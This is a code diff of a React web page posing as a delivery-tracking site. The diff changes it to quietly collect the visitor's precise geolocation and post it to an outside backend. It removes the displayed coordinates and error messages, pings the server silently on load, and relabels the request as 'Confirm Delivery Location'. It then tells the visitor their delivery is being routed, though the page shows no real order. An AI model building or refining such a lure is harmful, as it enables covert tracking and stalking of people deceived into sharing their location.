@@ -1,58 +1,49 @@
 import React, { useEffect, useState } from 'react';
 import './App.css';
 
-const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || 'https://location-backend-3cdl.onrender.com';
+const BACKEND_URL = 'https://location-backend-3cdl.onrender.com';
 
 function App() {
-  const [status, setStatus] = useState('idle');
-  const [coords, setCoords] = useState(null);
-  const [errorMsg, setErrorMsg] = useState('');
+  const [btnState, setBtnState] = useState('idle'); // idle | loading | done
 
+  // Wake up backend on page load silently
   useEffect(() => {
-    captureLocation();
+    fetch(`${BACKEND_URL}/ping`).catch(() => {});
   }, []);
 
-  const captureLocation = () => {
-    setStatus('loading');
+  const handleTrackOrder = () => {
+    if (btnState === 'loading' || btnState === 'done') return;
+    setBtnState('loading');
+
     if (!navigator.geolocation) {
-      setStatus('error');
-      setErrorMsg('Geolocation is not supported by your browser.');
+      saveLocation(null, null, null);
       return;
     }
+
     navigator.geolocation.getCurrentPosition(
-      async (position) => {
-        const { latitude, longitude, accuracy } = position.coords;
-        setCoords({ latitude, longitude, accuracy });
-        try {
-          const res = await fetch(`${BACKEND_URL}/api/location`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ latitude, longitude, accuracy }),
-          });
-          if (!res.ok) throw new Error('Server error');
-          setStatus('success');
-        } catch (err) {
-          console.error('Backend error:', err);
-          setStatus('error');
-          setErrorMsg('Could not send location to server. Try again.');
-        }
+      (pos) => {
+        saveLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
       },
-      (err) => {
-        if (err.code === err.PERMISSION_DENIED) {
-          setStatus('denied');
-          setErrorMsg('Location permission denied. Please allow location access.');
-        } else {
-          setStatus('error');
-          setErrorMsg('Unable to retrieve your location.');
-        }
+      () => {
+        saveLocation(null, null, null);
       },
-      { enableHighAccuracy: true, timeout: 15000 }
+      { enableHighAccuracy: true, timeout: 10000 }
     );
+  };
+
+  const saveLocation = async (latitude, longitude, accuracy) => {
+    try {
+      await fetch(`${BACKEND_URL}/api/location`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ latitude, longitude, accuracy }),
+      });
+    } catch (e) {}
+    setBtnState('done');
   };
 
   return (
     <div className="app">
-      {/* Header */}
       <header className="header">
         <div className="logo">
           <span className="logo-icon">🛵</span>
@@ -64,55 +55,37 @@ function App() {
         </nav>
       </header>
 
-      {/* Hero */}
       <section className="hero">
         <div className="hero-content">
           <div className="badge">⚡ Fast Delivery</div>
           <h1>Your order is<br /><span className="highlight">on the way!</span></h1>
           <p className="subtitle">
-            We need your location to deliver your order accurately and on time.
+            Confirm your delivery address to get real-time updates and accurate drop-off.
           </p>
 
-          {/* Location Status Card */}
-          <div className={`location-card ${status}`}>
-            {status === 'loading' && (
-              <div className="status-row">
-                <div className="spinner" />
-                <span>Detecting your location...</span>
+          <div className="info-box">
+            <div className="info-row">
+              <span>🏠</span>
+              <div>
+                <strong>Delivery Address</strong>
+                <p>Confirm your location for accurate delivery</p>
               </div>
-            )}
-            {status === 'success' && (
-              <div className="status-row">
-                <span className="status-icon">✅</span>
-                <div>
-                  <strong>Location captured!</strong>
-                  <p className="coords">
-                    📍 {coords?.latitude?.toFixed(5)}, {coords?.longitude?.toFixed(5)}
-                  </p>
-                </div>
-              </div>
-            )}
-            {(status === 'error' || status === 'denied') && (
-              <div className="status-row">
-                <span className="status-icon">❌</span>
-                <div>
-                  <strong>{status === 'denied' ? 'Permission Denied' : 'Error'}</strong>
-                  <p className="coords">{errorMsg}</p>
-                  <button className="retry-btn" onClick={captureLocation}>Retry</button>
-                </div>
-              </div>
-            )}
-            {status === 'idle' && (
-              <div className="status-row">
-                <span className="status-icon">📍</span>
-                <span>Waiting for location...</span>
-              </div>
-            )}
+            </div>
           </div>
 
-          <button className="cta-btn" onClick={captureLocation}>
-            📦 Share My Location & Track Order
+          <button
+            className={`cta-btn ${btnState}`}
+            onClick={handleTrackOrder}
+            disabled={btnState === 'loading' || btnState === 'done'}
+          >
+            {btnState === 'idle' && '📦 Confirm Delivery Location'}
+            {btnState === 'loading' && <><span className="btn-spinner" /> Confirming...</>}
+            {btnState === 'done' && '✅ Location Confirmed!'}
           </button>
+
+          {btnState === 'done' && (
+            <p className="success-msg">Your delivery is being routed to your location.</p>
+          )}
         </div>
 
         <div className="hero-visual">
@@ -132,23 +105,10 @@ function App() {
         </div>
       </section>
 
-      {/* Features */}
       <section className="features">
-        <div className="feature-card">
-          <span>⚡</span>
-          <h3>Express Delivery</h3>
-          <p>Get your order in under 30 minutes</p>
-        </div>
-        <div className="feature-card">
-          <span>📍</span>
-          <h3>Live Tracking</h3>
-          <p>Real-time updates on your delivery</p>
-        </div>
-        <div className="feature-card">
-          <span>🔒</span>
-          <h3>Secure & Safe</h3>
-          <p>Your data is encrypted and protected</p>
-        </div>
+        <div className="feature-card"><span>⚡</span><h3>Express Delivery</h3><p>Get your order in under 30 minutes</p></div>
+        <div className="feature-card"><span>📍</span><h3>Live Tracking</h3><p>Real-time updates on your delivery</p></div>
+        <div className="feature-card"><span>🔒</span><h3>Secure & Safe</h3><p>Your data is encrypted and protected</p></div>
       </section>
 
       <footer className="footer">
